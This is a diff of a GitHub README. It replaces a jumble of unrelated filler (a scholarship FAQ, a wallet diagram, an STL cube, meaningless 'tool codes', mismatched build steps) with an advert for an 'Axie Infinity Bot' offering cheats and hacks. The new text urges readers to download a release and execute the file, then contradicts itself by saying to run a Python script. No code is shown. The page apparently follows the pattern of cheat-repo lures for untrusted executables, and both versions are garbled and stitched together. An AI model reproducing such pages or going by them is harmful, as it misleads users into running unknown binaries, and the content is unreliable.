@@ -1,189 +1,83 @@
-<div align="center">
-<a href="z"><img src="https://img.shields.io/badge/ChatGPT-74aa9c?style=for-the-badge&logo=openai&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Bitcoin-000000?style=for-the-badge&logo=bitcoin&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Litecoin-A6A9AA?style=for-the-badge&logo=Litecoin&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/.NET-512BD4?style=for-the-badge&logo=dotnet&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Visual_Studio-5C2D91?style=for-the-badge&logo=visual%20studio&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/VSCode-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white"/></a>
-</div>
+# Axie Infinity Bot - Automate Your Gameplay! 🎮🚀
 
-<h1 align="center">
-    <a href="https://amplication.com/#gh-light-mode-only">
-    <img src="https://github.com/fikfifkasd/asd2342/assets/80986477/e7e2f3b4-3e31-46b5-b23a-9219a301d842">
-    </a>
-    <a href="https://amplication.com/#gh-dark-mode-only">
-    <img src="https://github.com/fikfifkasd/asd2342/assets/80986477/e7e2f3b4-3e31-46b5-b23a-9219a301d842">
-    </a>
-</h1>
+![Axie Infinity Bot](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen?style=flat&logo=github)
 
-<p align="center">
-  <i align="center">Building System Applications with C# & C++ 🚀</i>
-</p>
-  
-<p align="center">
-  Hi, I'm Mathieu 👋 I'm a 🚀 French developer 🚀 I ❤️ Happy Hardcore ❤️
-</p>
+Welcome to the **Axie Infinity Bot** repository! This bot automates farming and clicker activities in the Axie Infinity game, allowing you to maximize your profits and enhance your gameplay efficiency. With crypto integration and API support, this tool is designed to give you an edge in the blockchain gaming world.
 
-## Read About
-A: You will be updated via email when a new scholarship slot becomes available at 9:30 AM Japan time. Scholarships are allotted on a first come first serve basis.A: Yes, you can return as our Scholar any time. Just click the invitation link included in the initial invitation email. After this you will receive the login credentials. However, please note that the Axies allotted to you in the second instance will be different from those you received, when you signed up for the first time.A: Make sure that you have verified your email after submitting your application. You MUST verify your email to receive the scholarship invitation.A: There is no minimum threshold for earnings, however, we would encourage you to play everyday and invite others to play! Accounts with low levels of activity will be automatically deactivated.
+## Table of Contents
 
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
 
+## Features ✨
 
-#### **Please Read First What You Need Part.**
-#### <p align="Left"><a href="#what-you-need-1">WHAT YOU NEED</a></p> 
+- **Automated Farming**: Let the bot handle your farming tasks while you focus on strategy.
+- **Clicker Automation**: Efficiently perform clicker activities without manual input.
+- **Crypto Integration**: Seamlessly connect with cryptocurrency platforms for easy transactions.
+- **API Support**: Utilize our API to enhance functionality and integrate with other tools.
+- **Cheats and Hacks**: Gain a competitive advantage with built-in cheats to boost your gameplay.
 
-![33](https://github.com/user-attachments/assets/f054778c-ec71-4b12-a5b8-be0b3b7a3a97)
+## Installation ⚙️
 
-https://github.com/user-attachments/assets/757e5ec9-a68d-4aeb-9de0-344951dd9ac3
+To get started, follow these steps:
 
-
-
-
-```mermaid
-erDiagram
-    PLAYER_WALLET {
-        string id
-        string playerName
-        float inGameCurrency
-    }
-    PLAYER_WALLET ||--o{ GAME_TRANSACTION : initiates
-    PLAYER_WALLET ||--o{ GAME_BALANCE : updates
-    GAME_TRANSACTION ||--o{ GAME_CONFIRMATION : confirms
-    GAME_CONFIRMATION ||--o{ PLAYER_WALLET : updates
-    GAME_CONFIRMATION ||--o{ GAME_BLOCKCHAIN : records
-    GAME_BLOCKCHAIN }|--o{ GAME_TRANSACTION : contains
-    GAME_BLOCKCHAIN }|--o{ GAME_BALANCE : contains
-```
-### What You Need
-----
-                    
-| Tool              | Code         |
-| ----------------- | ------------ |
-| Blockchain Explorer | 0000       |
-| Cryptogame  | Daf     |
-| Farm      | 000          |
-| Auto Clicker  | ST8 |
-| Solana Explorer   | 91           |
-
-                
-----
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-<!-- ROADMAP -->
-## Roadmap
-
-- [x] New Gui
-- [ ] Add back to top links
-- [x] Add Additional Templates w/ Examples
-- [x] New Features
-- [ ] Multi-language Support
-    - [ ] Chinese
-    - [ ] Turkish
-    - [ ] French
-    - [ ] Spanish
-
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-<!-- GETTING STARTED -->
-## Getting Started
-
-### Prerequisites
-
-This is an example of how to list things you need to use the software and how to install them.
-* npm
-  ```sh
-  npm install npm@latest -g
-  ```
-
-### Installation
-
-1. Download Visual Studio 2022
-_using Git Clone Or either download the project or exit the rar. Then Download Visual Studio 2022 Here Link [VisualStudio Download](https://visualstudio.microsoft.com/downloads/)_
-![last1](https://github.com/fikfifkasd/asd2342/assets/80986477/df0c0345-8a39-4bab-83ce-9211c8324283)
-> Download These
-
-2. Clone the repo
-   ```sh
-   git clone https://github.com/SoonAdd/Addsoon.git
+1. **Clone the Repository**: 
+   ```bash
+   git clone https://github.com/IronForgh/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack.git
    ```
-3. OR
 
-![download](https://github.com/fikfifkasd/asd2342/assets/80986477/29a942a4-924c-4a97-9e76-99f49b7ec27a)
-
-
-4. _Then open the sln (Project Solution) file_
-
-![vsgif](https://github.com/fikfifkasd/asd2342/assets/80986477/e6351858-7564-4d41-adce-56b8ad70898c)
-
-5. Find Executable File
-   ```sh
-   /ProjectName/Bin/Debug/Executable.exe
+2. **Navigate to the Directory**:
+   ```bash
+   cd Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack
    ```
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
 
-```stl
-solid cube_corner
-  facet normal 0.0 -1.0 0.0
-    outer loop
-      vertex 0.0 0.0 0.0
-      vertex 1.0 0.0 0.0
-      vertex 0.0 0.0 1.0
-    endloop
-  endfacet
-  facet normal 0.0 0.0 -1.0
-    outer loop
-      vertex 0.0 0.0 0.0
-      vertex 0.0 1.0 0.0
-      vertex 1.0 0.0 0.0
-    endloop
-  endfacet
-  facet normal -1.0 0.0 0.0
-    outer loop
-      vertex 0.0 0.0 0.0
-      vertex 0.0 0.0 1.0
-      vertex 0.0 1.0 0.0
-    endloop
-  endfacet
-  facet normal 0.577 0.577 0.577
-    outer loop
-      vertex 1.0 0.0 0.0
-      vertex 0.0 1.0 0.0
-      vertex 0.0 0.0 1.0
-    endloop
-  endfacet
-endsolid
-```
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+3. **Download the Latest Release**: Visit the [Releases](https://github.com/IronForgh/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack/releases) section to download the latest version of the bot. Execute the downloaded file to install.
 
-<!-- CONTRIBUTING -->
-## Contributing
-<a href="https://opencollective.com/democracyearth/backer/0/website"><img src="https://opencollective.com/democracyearth/backer/0/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/1/website"><img src="https://opencollective.com/democracyearth/backer/1/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/2/website"><img src="https://opencollective.com/democracyearth/backer/2/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/3/website"><img src="https://opencollective.com/democracyearth/backer/3/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/4/website"><img src="https://opencollective.com/democracyearth/backer/4/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/5/website"><img src="https://opencollective.com/democracyearth/backer/5/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/6/website"><img src="https://opencollective.com/democracyearth/backer/6/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/7/website"><img src="https://opencollective.com/democracyearth/backer/7/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/8/website"><img src="https://opencollective.com/democracyearth/backer/8/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/9/website"><img src="https://opencollective.com/democracyearth/backer/9/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/10/website"><img src="https://opencollective.com/democracyearth/backer/10/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/11/website"><img src="https://opencollective.com/democracyearth/backer/11/avatar.svg"></a>
+## Usage 📈
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+After installation, follow these steps to start using the bot:
 
-<p align="center">
-    <img src="https://minkxx-spotify-readme.vercel.app/api?theme=dark&rainbow=true&scan=true&spin=True" alt="Preview">
-</p>
+1. **Configure Settings**: Open the configuration file and adjust settings according to your preferences.
+2. **Start the Bot**: Run the bot using the command:
+   ```bash
+   python bot.py
+   ```
+3. **Monitor Performance**: Keep an eye on the bot's performance through the dashboard.
 
+### Tips for Optimal Use
 
-Not sure where to start? Join our discord and we will help you get started!
+- Regularly check for updates in the [Releases](https://github.com/IronForgh/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack/releases) section to ensure you have the latest features and fixes.
+- Experiment with different settings to find what works best for your gameplay style.
 
-<a href="https://discord.gg/U3UqGHxf"><img src="https://amplication.com/images/discord_banner_purple.svg" /></a>
+## Contributing 🤝
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+We welcome contributions from the community! If you want to improve the bot or add new features, please follow these steps:
 
-<p align="center">
-  <img src="https://github.com/tarikmanoar/tarikmanoar/raw/output/github-snake-dark.svg" alt="snake"></center>
-</p>
+1. **Fork the Repository**: Click on the fork button at the top right of the page.
+2. **Create a New Branch**:
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+3. **Make Your Changes**: Implement your changes and test them thoroughly.
+4. **Submit a Pull Request**: Push your changes and submit a pull request for review.
+
+## License 📜
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Support 💬
+
+If you encounter any issues or have questions, feel free to reach out. You can open an issue in the repository or contact us through our support channels.
+
+### Additional Resources
+
+- **Documentation**: For more detailed instructions and information, check our [Wiki](https://github.com/IronForgh/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack/wiki).
+- **Community Forum**: Join discussions with other users on our community forum to share tips and strategies.
+
+## Conclusion
+
+The **Axie Infinity Bot** is your key to unlocking a more efficient and profitable gaming experience. Download the latest version from the [Releases](https://github.com/IronForgh/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack/releases) section and take your gameplay to the next level. Happy gaming! 🎉
